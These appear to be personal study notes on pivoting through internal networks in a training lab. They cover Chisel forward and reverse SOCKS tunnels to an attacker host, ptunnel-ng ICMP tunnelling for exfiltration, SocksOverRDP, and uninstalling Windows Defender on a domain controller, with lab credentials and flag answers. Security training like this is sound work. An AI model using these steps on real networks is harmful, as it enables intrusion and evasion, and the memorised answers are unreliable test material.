Note: Depending on the version of the glibc library installed on both (target and workstation) systems, there might be discrepancies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of chisel, which can be found in the Releases section of the GitHub repository.

\\Building the Chisel Binary
$ cd chisel
go build

It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "Tunneling with Chisel and SSF" and IppSec's walkthrough of the box Reddish. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his video.
-Once the binary is built, we can use SCP to transfer it to the target pivot host.

\\Transferring Chisel Binary to Pivot Host
$ scp chisel ubuntu@10.129.202.64:~/

Then we can start the Chisel server/listener.
\\Running the Chisel Server on the Pivot Host
$ ./chisel server -v -p 1234 --socks5
-The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

\\Connecting to the Chisel Server
$ ./chisel client -v 10.129.202.64:1234 socks
he Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at /etc/proxychains.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

\\Editing & Confirming proxychains.conf
-We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using tail.
$$ tail -f /etc/proxychains.conf 
-Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

\\Pivoting to the DC
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

\\Chisel Reverse Pivot
-scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
-When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed
-The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

\\Starting the Chisel Server on our Attack Host
$ sudo ./chisel server --reverse -v -p 1234 --socks5

\\Connecting the Chisel Client to our Attack Host
$ ./chisel client -v 10.10.14.17:1234 R:socks

\\Editing & Confirming proxychains.conf
$ tail -f /etc/proxychains.conf

$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

\\OLder verrsion chisel
https://github.com/jpillora/chisel/releases

<Test>Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.
$ wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
$ gunzip chisel_1.7.6_linux_amd64.gz 
scp chisel_1.7.6_linux_amd64 ubuntu@STMIP:~/

ssh ubuntu@STMIP
chmod +x chisel_1.7.6_linux_amd64
./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5

Then, from Pwnbox/PMVPN, students need to run chisel as a client to connect to the chisel server running on the Ubuntu pivot host:
-chmod +x chisel_1.7.6_linux_amd64
./chisel_1.7.6_linux_amd64 client -v STMIP:9001 socks
-Students must ensure that the following proxychains SOCKS5 entry is found (and that the SOCKS4 default entry is commented out) within the proxychains.conf file on Pwnbox/PMVPN:
add  socks5 127.0.0.1 1080
$ tail -n2 /etc/proxychains.conf Students must ensure that the following proxychains SOCKS5 entry is found (and that the SOCKS4 default entry is commented out) within the proxychains.conf file on Pwnbox/PMVPN:
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
Th3$eTunne1$@rent8oring!
type \Documents\flag.txt

$ scp chisel ubuntu@10.129.202.64:~/
$ ./chisel server -v -p 1234 --socks5
$ ./chisel client -v 10.129.202.64:1234 socks
$$ tail -f /etc/proxychains.conf 
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

\\======================================================
ICMP Tunneling with SOCKS
ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses.
- ICMP tunneling would only work when ping responses are permitted within a firewalled network.
- When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. 
-The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.
-We will use the ptunnel-ng tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the ptunnel-ng client. We can start the ptunnel-ng server on the target pivot host. Let's start by setting up ptunnel-ng.

\\Setting Up & Using ptunnel-ng
-If ptunnel-ng is not on our attack host, we can clone the project using git.

\\Cloning Ptunnel-ng
$ git clone https://github.com/utoni/ptunnel-ng.git

Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the
 root of the ptunnel-ng directory.

\\Building Ptunnel-ng with Autogen.sh
$ sudo ./autogen.sh 
If we want to transfer the entire repo and the files contained inside,
 we will need to use the -r option with SCP.

\\Alternative approach of building a static binary
$ sudo apt install automake autoconf -y
$ cd ptunnel-ng/
$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
$ ./autogen.sh

\\Transferring Ptunnel-ng to the Pivot Host
$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/

With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.

\\Starting the ptunnel-ng Server on the Target Host
$ sudo ./ptunnel-ng -r10.129.202.64 -R22
The IP address following -r should be the IP of the jump-box we want ptunnel-ng to accept connections on
-whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.
-connect to the ptunnel-ng server (-p <ipAddressofTarget>) but ensure this happens through local port 2222 (-l2222). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

\\Connecting to ptunnel-ng Server from Attack Host
$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
-With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).

\\Tunneling an SSH connection through an ICMP Tunnel
$ ssh -p2222 -lubuntu 127.0.0.1
-If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.

On the client & server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.

\\Viewing Tunnel Traffic Statistics
-We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

\\Enabling Dynamic Port Forwarding over SSH
$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

-We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.

$ proxychains nmap -sV -sT 172.16.5.19 -p3389
\\Network Traffic Analysis Considerations
-confirm the tools we are using are performing as advertised and that we have set up & are operating them properly.
-n the case of tunneling traffic through different protocols taught in this section with ICMP tunneling, we can benefit from analyzing the traffic we generate with a packet analyzer like Wireshark. Take a close look at the short clip below.

-In the first part of this clip, a connection is established over SSH without using ICMP tunneling. We may notice that TCP & SSHv2 traffic is captured.
Note: Consider the versions of GLIBC, make sure you are on par with the one on the target.

<Test> Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer.
$ git clone https://github.com/utoni/ptunnel-ng.git
$ sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
$ sudo ./ptunnel-ng -r10.129.202.64 -R22
$ sudo ./ptunnel-ng/src/ptunnel-ng -r10.129.151.105 -R22

$ sudo ./ptunnel-ng/src/ptunnel-ng -p10.129.151.105 -l2222 -r10.129.151.105 -R22
$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
$ ssh -p2222 -lubuntu 127.0.0.1
$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
Then, from Pwnbox/PMVPN, students need to use proxychains to connect to the DC on the internal network, utilizing the credentials victor:pass@123:
proxychains nmap -sV -sT 172.16.5.19 -p3389
$proxychains xfreerdp /v:<ip> /u: /p: /dynamic-resolution
type .\Downloads\flag.txt.txt
N3Tw0rkTunnelV1sion!

\\\\\\\\\\\===============================================
RDP and SOCKS Tunneling with SocksOverRDP
-use tools available for Windows operating systems in these cases. SocksOverRDP is an example of a tool that uses Dynamic Virtual Channels (DVC) from the Remote Desktop Service feature of Windows.
-DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing.
-this feature can also be used to tunnel arbitrary packets over the network. We can use SocksOverRDP to tunnel our custom packets and then proxy through it. We will use the tool Proxifier as our proxy server.
-SocksOverRDP x64 Binaries  https://github.com/nccgroup/SocksOverRDP/releases
-Proxifier Portable Binary  https://www.proxifier.com/download/#win-tab

We can then connect to the target using xfreerdp and copy the SocksOverRDPx64.zip file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.

\\Loading SocksOverRDP.dll using regsvr32.ex
$C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll

-Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials victor:pass@123 to connect to 172.16.5.19.
-We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.
-When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.

\\Confirming the SOCKS Listener is Started
$C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080
-we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. See the clip below for a quick walkthrough of configuring Proxifier.

\\Configuring Proxifier
-With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.

\\RDP Performance Considerations
- especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the Experience tab in mstsc.exe and set Performance to Modem.

<Test>Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.
$python3 http.server 8000
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip
unzip SocksOverRDP-x64.zip
unzip ProxifierPE.zip
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
After connecting successfully, and before downloading the two files and one directory, students can either uninstall or turn off Windows Defender (otherwise the DLL will not be allowed to be loaded and will get deleted automatically, and in case it does get deleted, students need to copy and paste it again), in here, it will be turned off, following the steps below:
Thereon, students need to transfer the files SocksOverRDP-Plugin.dll, SocksOverRDP-Server.exe and the Proxifier PE director
$regsvr32.exe SocksOverRDP-Plugin.dll
-Afterward, students need to open mstsc.exe from within PowerShell and connect to the 
internal DC at 172.16.5.19, using the credentials victor:pass@123:
-Then, students need to transfer SocksOverRDP-Server.exe to the internal DC at 172.16.5.19, however, before that, they need to uninstall Windows Defender (otherwise the executable will be deleted constantly):
PS>Uninstall-WindowsFeature -Name Windows-Defender
Once uninstalled, students can copy and paste the executable to the DC:
Subsequently, students need to run it as administrator:
Thereon, students need to run the Proxifier executable as administrator:
-Once opened, students need to click on Profile --> Proxy Servers...
-Students need to set 127.0.0.1:1080 as the proxy's socket and use SOCKS5:
-At last, students need to use mstsc.exe to connect to the internal node at 172.16.6.155 
using the credentials jason:WellConnected123!:
-Once successfully connected, students will find the flag H0pping@roundwithRDP! on the desktop:

-Skills Assessment
